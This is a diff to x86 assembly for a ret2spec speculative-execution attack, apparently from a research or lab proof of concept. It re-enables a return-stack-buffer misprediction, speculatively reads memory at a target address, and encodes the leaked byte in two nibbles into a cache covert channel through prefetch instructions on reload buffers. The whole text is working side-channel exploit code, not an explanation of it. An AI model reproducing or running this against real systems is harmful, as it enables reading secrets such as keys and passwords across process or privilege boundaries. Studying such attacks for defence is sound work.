@@ -15,22 +15,31 @@ rsb_mispredict:
   ret
 
 // rdi: leak address
-// rsi: reload buffer
+// rsi: nibble 0 of reload buffer
+// rdx: nibble 1 of reload buffer
 ret2spec:
   pushq %rbp
   movq %rsp, %rbp
 
-  xor %rax, %rax
-  movq $0x00ffffffffffffff, %r8
-  movq $0x0000544552434553, %r9
-
   // This call actually modifies its return pointer to be at
   // ret2spec_end, so the instructions between the call and
   // the ret2spec_end label are never executed (except speculatively)
-  //call rsb_mispredict
-  
+  call rsb_mispredict
+
+  xor %rax, %rax
+  xor %rcx, %rcx
+
   // Leak the value at (%rdi)
-  movb (%rdi), %al
+  //movq $0x42, %rax
+  movq (%rdi), %rax
+  movq %rax, %rcx
+  andq $0x0f, %rcx
+  andq $0xf0, %rax
+  shl $0x8, %rax
+  shl $0xc, %rcx
+  prefetcht0 (%rdx, %rax)
+  prefetcht0 (%rsi, %rcx)
+  mfence
 
   // Do the mask and subtracting thing to make sure we
   // actually leak the thing
@@ -41,10 +50,9 @@ ret2spec:
   // Covert channel for the leaked value
   // These two instructions are never actually executed, but are speculatively
   // executed. They have a side effect on the cache
-  shl $0xc, %eax
-  prefetcht0 (%rsi, %rax)
-  mov (%rsi, %rax), %r8
-  mfence
+  // shl $0xc, %rax
+  // prefetcht0 (%rsi, %rax)
+  // mfence
 
 loop:
   pause
